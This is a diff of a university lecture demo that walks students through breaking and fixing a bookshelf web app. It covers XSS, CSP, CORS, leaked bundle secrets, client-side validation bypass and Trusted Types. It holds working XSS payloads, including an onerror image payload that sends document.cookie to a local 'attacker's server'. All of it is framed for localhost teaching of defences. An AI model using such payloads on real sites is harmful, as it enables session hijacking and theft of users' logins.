@@ -1,180 +1,168 @@
-# Demo: break it, then fix it — 06a Web Security
+# Break it, then fix it: Web Security
 
-**CSCI 3230U · Lecture 06a · instructor run-sheet (not a student handout)**
+**CSCI 3230U · Lecture 06a · demo walkthrough**
 
-This is the live demo for slide 16. It starts from the class 9 bookshelf
-(the typed solution) and attacks it, then defends it in layers. Everything
-runs on `localhost`; no real site and no real cookie is involved.
+This is the bookshelf from class 9 (the typed solution), used to show
+cross-site scripting (XSS), CORS, and a few other attacks, and the defences
+against them. You can rerun everything we did in class on your own machine.
 
-The bookshelf already does the right thing — `bookCard` uses
-`textContent`, with the comment *"textContent, never innerHTML: titles are
-typed by users (XSS)."* The demo's whole point is to undo that one line,
-watch the page get taken over, and then earn the line back.
+> **Only on `localhost`.** Every attack here targets your own copy of the
+> page and sends data to your own machine. Don't try these payloads on
+> sites you don't own: that is illegal, not practice.
 
-## What you need open before class
+## What's in this folder
 
-Three terminals, all inside this `demo/` folder, plus a browser:
+The files are saved **after** the demo, so the defences are on and the
+attack is still in the data:
+
+| File | What to look at |
+|---|---|
+| `src/script.ts` | `bookCard` renders the title with `textContent`. The unsafe `innerHTML` line is commented out right below it. Also has a fake `API_KEY` (step 7). |
+| `index.html` | a `Content-Security-Policy` `<meta>` in `<head>` (step 5) |
+| `books.json` | book `"5"` has an XSS payload as its title (step 3) |
+| `collector.py` | a tiny "attacker's server" that prints whatever is sent to it |
+
+## Setup
+
+You need Node.js and Python 3. Open three terminals in this `demo/` folder:
 
 | # | Command | What it is |
 |---|---|---|
-| 1 | `npm install` then `npm run build` then `npm run serve` | the site, on `http://localhost:8000` |
-| 2 | `npm run watch` | rebuilds `dist/` on every save (leave running) |
-| 3 | `python3 collector.py` | the "attacker's server", on `http://localhost:9000` |
+| 1 | `npm install`, `npm run build`, `npm run serve` | the site, on `http://localhost:8000` |
+| 2 | `npm run watch` | rebuilds `dist/` every time you save (leave it running) |
+| 3 | `python3 collector.py` | the attacker's server, on `http://localhost:9000` |
 
-Open `http://localhost:8000` in Chrome with DevTools showing the
-**Console** tab. Keep the editor on `src/script.ts` and `index.html`.
+Open `http://localhost:8000` in Chrome, with DevTools open on the
+**Console** tab.
 
-> First run only: `npm install` pulls TypeScript into `node_modules/`.
-> `dist/` and `node_modules/` are rebuilt from source, so they aren't
-> committed.
-
-Each step says **what to do**, **what the class sees**, and the **line to
-land**. Timings are a guide; the short path (if the lecture ran long) is
-steps 1–5 then 7, skipping 6 and 8–10.
+`dist/` and `node_modules/` aren't committed. `npm install` and
+`npm run build` recreate them.
 
 ---
 
-## 1. The page works (30 sec)
+## 1. The safe page
 
-Reload `http://localhost:8000`. Four books load after a short delay (the
-`slowFetch` from class 9). Add a book with the form — it appears. Remove
-one — it goes.
+Reload the page. Five books load. The fifth one's title is literally
+`<img src=x onerror=...>`: the payload is in the data, but it's shown
+**as text** and nothing runs. Terminal 3 stays silent.
 
-> **Land it:** "This is the app from last class. Nothing here is unsafe
-> yet. Watch how little it takes to change that."
+That's `textContent` doing its job. It puts characters on the page and
+never parses them as HTML.
 
-## 2. Break it: innerHTML (1 min)
+## 2. Break it: innerHTML
 
-In `src/script.ts`, find the title line in `bookCard`:
-
-```ts
-  // textContent, never innerHTML: titles are typed by users (XSS).
-  const title = document.createElement("h3");
-  title.textContent = book.title;        // <-- this line
-```
-
-Change **only** that one line to:
+In `src/script.ts`, in `bookCard`, swap the two title lines so the unsafe
+one is active:
 
 ```ts
+  // title.textContent = book.title;
   title.innerHTML = book.title;          // DANGER (on purpose)
 ```
 
-Save. Terminal 2 rebuilds. This is **not** a type error — `innerHTML`
-takes a string — so it compiles cleanly. That's the point: the type
-checker from last class does nothing here.
+Save; terminal 2 rebuilds. **This compiles cleanly.** `innerHTML` takes a
+string, so TypeScript has nothing to complain about.
 
-> **Land it:** "TypeScript is happy. A type system catches the wrong
-> *shape* of data, not a dangerous *use* of it. Security is a separate
-> problem."
+> A type system checks the *shape* of your data, not whether you're
+> *using* it dangerously. Security is a separate problem.
 
-## 3. It's only text... until it isn't (2 min)
-
-Reload. Add three books, one title at a time, and narrate each:
-
-| Title you type | What happens | Why |
-|---|---|---|
-| `<b>bold</b>` | the word **bold**, in bold | `innerHTML` parsed it as a tag |
-| `<script>alert(1)</script>` | *nothing* | `innerHTML` won't run injected `<script>` |
-| `<img src=x onerror="alert('XSS')">` | an alert box fires | the image fails to load, so `onerror` runs |
-
-> **Land it:** "Blocking `<script>` is not a defence — the third one has no
-> `<script>` in it. Any attribute that runs code, like `onerror`, is
-> enough. This is **cross-site scripting**: their code, running in our
-> page, as our page."
-
-(Close the alert. Alerts block the page — this is the one place in the demo
-we use one, and only for a beat.)
-
-## 4. Stored XSS and a stolen cookie (4 min)
-
-So far *we* typed the payload. Real XSS is **stored**: it rides in the data
-every visitor loads. Our `books.json` is that data — the "API response"
-from class 7.
-
-First give the page a cookie to steal (it sets none on its own). In the
+Reload. The fifth card's title is gone and no cookie is stolen. Check the
 Console:
-
-```js
-document.cookie = "session=abc123";
-```
-
-Now open `books.json` and add a fifth book whose **title is the payload**.
-Point it at the collector in terminal 3:
-
-```json
-  { "id": "5", "title": "<img src=x onerror=\"new Image().src='http://localhost:9000/?c='+document.cookie\">", "author": "nobody", "status": "want", "pages": 1 }
-```
-
-(Mind the JSON: the inner quotes are escaped with `\"`.) Save. Reload the
-page — **don't type anything this time.**
-
-Terminal 3 prints:
-
-```
->>> STOLEN  ?c=session=abc123
-```
-
-> **Land it:** "No one typed anything. The payload was in the data, it ran
-> for every visitor, and it sent the session cookie to a server we don't
-> control. On a real site that cookie *is* the login."
-
-Leave the payload in `books.json` for the next steps — it's the thing the
-defences have to stop.
-
-## 5. Fix it: textContent (1 min)
-
-Put the line in `src/script.ts` back:
-
-```ts
-  title.textContent = book.title;
-```
-
-Save, reload. The malicious book now shows its title **as literal text**:
-`<img src=x onerror=...>` appears on the card, harmless. Terminal 3 stays
-silent.
-
-> **Land it:** "`textContent` is escaping. The browser shows the characters
-> and runs nothing. This is the first and most important layer — output
-> data as text, not as HTML."
-
-## 6. Backstop: a Content-Security-Policy (3 min, slide 8)
-
-Layers exist because someone will add an `innerHTML` next year. Show the
-backstop that catches it anyway.
-
-Break the line again (`innerHTML`). Reload — the cookie is stolen again.
-Now add a CSP to `index.html`, in `<head>`:
-
-```html
-  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
-```
-
-Reload. The payload is **blocked** and the Console shows:
 
 ```
 Refused to execute inline event handler because it violates the
 following Content Security Policy directive: "script-src 'self'".
 ```
 
-The app still works: `dist/script.js` is from our own origin (`'self'`).
+The **CSP** in `index.html` blocked it. Step 5 explains how. For now,
+turn it off: comment out the `<meta http-equiv="Content-Security-Policy" ...>`
+line in `index.html` and save.
 
-> **Land it:** "The bug is still there — `innerHTML` is still wrong — but
-> the CSP refused the injected handler. `script-src` without
-> `'unsafe-inline'` blocks every inline `onerror` and inline `<script>`.
-> Defence in depth: the sanitizing slipped, the CSP held."
+## 3. It's only text... until it isn't
 
-Put `textContent` back and remove the CSP line before moving on, so the
-rest of the demo starts clean. (Or keep the CSP — it does no harm.)
+Reload. Use the form to add three books, one title at a time:
 
-## 7. CORS: our own page, refused (2 min, slide 12)
+| Title you type | What happens | Why |
+|---|---|---|
+| `<b>bold</b>` | the word **bold**, in bold | `innerHTML` parsed it as a tag |
+| `<script>alert(1)</script>` | nothing | `innerHTML` never runs an injected `<script>` |
+| `<img src=x onerror="alert('XSS')">` | an alert box pops up | the image fails to load, so `onerror` runs |
 
-Different port = different origin. In a **second** terminal in this folder:
+Blocking `<script>` is **not** a defence: the third title has no `<script>`
+in it. Any attribute that runs code, like `onerror`, is enough. This is
+**cross-site scripting**: someone else's code running inside your page,
+with your page's permissions.
+
+## 4. Stored XSS and a stolen cookie
+
+In step 3 *you* typed the payload. Real XSS is usually **stored**: it sits
+in the data that every visitor loads. Here, that data is book `"5"` in
+`books.json`:
+
+```json
+"title": "<img src=x onerror=\"new Image().src='http://localhost:9000/?c='+document.cookie\">"
+```
+
+When the image fails to load, `onerror` requests an "image" from the
+collector, with the page's cookies in the URL.
+
+Give the page a cookie to steal (it doesn't set any itself). In the Console:
+
+```js
+document.cookie = "session=abc123";
+```
+
+Reload, **without typing anything**. Terminal 3 prints:
+
+```
+>>> STOLEN  ?c=session=abc123
+```
+
+No one typed anything. The payload came in with the data, ran for every
+visitor, and sent the session cookie to a server the attacker controls. On
+a real site, that cookie *is* the user's login.
+
+## 5. Two layers of defence
+
+**Layer 1: `textContent`.** Put the safe line back in `src/script.ts`:
+
+```ts
+  title.textContent = book.title;
+  // title.innerHTML = book.title;
+```
+
+Reload. The payload is plain text again, and the collector stays silent.
+This is the first and most important rule: **output user data as text,
+not HTML.**
+
+**Layer 2: Content-Security-Policy.** People make mistakes, and someone
+will add an `innerHTML` later. Switch back to `innerHTML`, then uncomment
+the CSP line in `index.html`:
+
+```html
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
+```
+
+Reload. The payload is blocked with the "Refused to execute inline event
+handler" error from step 2, and the app still works, because
+`dist/script.js` comes from our own origin (`'self'`).
+
+`script-src 'self'` blocks every inline `<script>` and every inline handler
+like `onerror` (unless you add `'unsafe-inline'`, which you shouldn't).
+The bug is still there, but the CSP stops it. That's **defence in depth**:
+when one layer fails, the next one catches it.
+
+Put `textContent` back before going on.
+
+## 6. CORS: your own page, refused
+
+A different port means a different **origin**. In another terminal in this
+folder, run:
 
 ```bash
 python3 -m http.server 8001
 ```
 
-On the page served from `:8000`, in the Console:
+Then, in the Console of the page on `:8000`:
 
 ```js
 fetch("http://localhost:8001/books.json").then(r => r.json()).then(console.log);
@@ -188,68 +176,59 @@ Access to fetch at 'http://localhost:8001/books.json' from origin
 'Access-Control-Allow-Origin' header is present on the requested resource.
 ```
 
-> **Land it:** "That's not an attack — that's the browser protecting the
-> *user*. `:8001` is a different origin and never said we're allowed to
-> read it. A CORS error is fixed on the **server**, by it sending
-> `Access-Control-Allow-Origin` — and the value is **our** origin,
-> `http://localhost:8000`, not its own. (Slide 12's header has that
-> backwards.)"
+This isn't an attack. The browser is protecting the **user**: `:8001`
+never said `:8000` is allowed to read its responses. A CORS error is fixed
+on the **server** that owns the data. It sends `Access-Control-Allow-Origin`
+with the origin of the page that's asking: here, `http://localhost:8000`,
+not its own.
 
-## 8. A secret in the bundle (1 min, slide 14)
+## 7. A secret in the bundle
 
-In `src/script.ts`, near the top, add:
+`src/script.ts` has this near the top:
 
 ```ts
 const API_KEY = "sk_live_abc123"; // pretend secret
 ```
 
-Save (watch rebuilds). In DevTools → **Sources** → `dist/script.js`, press
-Ctrl-F and search `sk_live`. There it is.
+In DevTools, open **Sources**, then `dist/script.js`, press Ctrl-F, and
+search for `sk_live`. There it is.
 
-> **Land it:** "Anything shipped to the browser is public — minifying
-> doesn't hide it, and a `.env` baked into the bundle doesn't either. When
-> React starts next week, `VITE_*` variables get built straight into the
-> bundle. Secrets stay on the server." *(Delete the line after.)*
+Everything you ship to the browser is public. Minifying doesn't hide it,
+and neither does a `.env` file that gets built into the bundle (for
+example, `VITE_*` variables in React/Vite projects). **Secrets stay on the
+server.**
 
-## 9. Bypass the UI (1 min, slide 15)
+## 8. Bypass the UI
 
-The form's `required` on the title is UX, not security. Prove it: in
-DevTools, select the title `<input>` and delete its `required` attribute,
-then submit empty. It goes through — the HTML check is gone, and nothing
-else enforces it.
+The title input has `required`. That's for user experience, not security.
+In DevTools **Elements**, select the title `<input>`, delete its `required`
+attribute, and submit the form empty. The book is added, because the HTML
+attribute was the only check.
 
-> **Don't** `curl -X POST http://localhost:8000/...` here: `python3 -m
-> http.server` only answers GET/HEAD, so a POST returns `501 Unsupported
-> method ('POST')`. That's not a bypass — there's no backend to bypass to.
-> Our demo is a static file server with no endpoint that accepts writes.
-> So the *server-side* half of the lesson can only be stated, not shown:
-> in a real app the POST would reach a handler, and **that** handler must
-> re-validate, because `curl` and DevTools skip every client check.
+Our demo uses a static file server (`python3 -m http.server` only answers
+GET/HEAD), so there's no backend to attack here. In a real app the form
+would POST to a server, and someone could send that request with `curl`
+and skip every check in the browser. **The server must validate
+everything again.**
 
-> **Land it:** "Client checks are for instant feedback. The form's
-> `required` just vanished in DevTools. In a real app a request can arrive
-> from `curl` with no browser at all, so the **server** must validate
-> everything again — that's the backend course."
+## 9. (Optional) Trusted Types + DOMPurify
 
-## 10. (Optional) Trusted Types + DOMPurify (slide 9)
-
-Only if there's time and you want to show the strongest layer. This needs a
-package and a Chromium browser.
+This is the strongest layer. It needs a Chromium browser and one package:
 
 ```bash
 npm install dompurify
 ```
 
-Add to the CSP so raw strings can't reach a sink at all:
+Extend the CSP so plain strings can't be assigned to `innerHTML` at all:
 
 ```html
   <meta http-equiv="Content-Security-Policy"
         content="script-src 'self'; require-trusted-types-for 'script'">
 ```
 
-With `innerHTML` still broken, reload: the page now **throws** at the
-assignment — `This document requires 'TrustedHTML' assignment`. The only
-way to produce `TrustedHTML` is one audited policy. In `src/script.ts`:
+With `innerHTML` active, reload. The page now **throws** at the assignment:
+`This document requires 'TrustedHTML' assignment`. The only way to make
+`TrustedHTML` is through a policy you write. In `src/script.ts`:
 
 ```ts
 import DOMPurify from "/node_modules/dompurify/dist/purify.es.mjs";
@@ -261,30 +240,24 @@ const policy = (window as any).trustedTypes.createPolicy("bookshelf", {
 title.innerHTML = policy.createHTML(book.title) as unknown as string;
 ```
 
-Reload. The title renders as text, the handler is stripped, nothing is
-stolen — and if anyone writes a *bare* `innerHTML` anywhere else, the
-browser throws instead of running it.
-
-> **Land it:** "DOMPurify strips the dangerous bits; Trusted Types makes
-> the browser refuse any HTML that didn't go through it. You can't forget a
-> sink, because forgetting throws."
+Reload. DOMPurify strips the `onerror`, nothing is stolen, and any other
+*bare* `innerHTML` anywhere in the app now throws instead of running. You
+can't forget to sanitize, because forgetting is an error.
 
 ---
 
-## Reset between runs / sections
+## Reset
 
 ```bash
-git checkout -- src/script.ts index.html books.json   # if under git
+git checkout -- src/script.ts index.html books.json
 ```
 
-Or by hand: title line back to `textContent`, remove the CSP `<meta>`,
-delete book `"5"` from `books.json`, delete the `API_KEY` line. Clear the
-cookie with `document.cookie = "session=; max-age=0";`.
+Clear the cookie with `document.cookie = "session=; max-age=0";`.
 
-## The five lines, if nothing else survives
+## The five takeaways
 
-1. **Never trust user data** — the client is the UI, the server is the gate.
+1. **Never trust user data**: the client is just the UI, the server is the gate.
 2. **XSS** is user input rendered as HTML → `textContent`, sanitize, CSP.
-3. **CSRF** is another site using your cookie → `SameSite`, tokens.
-4. **CORS** protects the user; the server opts in, naming *your* origin.
-5. **Secrets stay server-side**; sessions in `HttpOnly` cookies.
+3. **CSRF** is another site using your cookie → `SameSite` cookies, CSRF tokens.
+4. **CORS** protects the user; the server opts in by naming *your* origin.
+5. **Secrets stay server-side**; keep sessions in `HttpOnly` cookies.
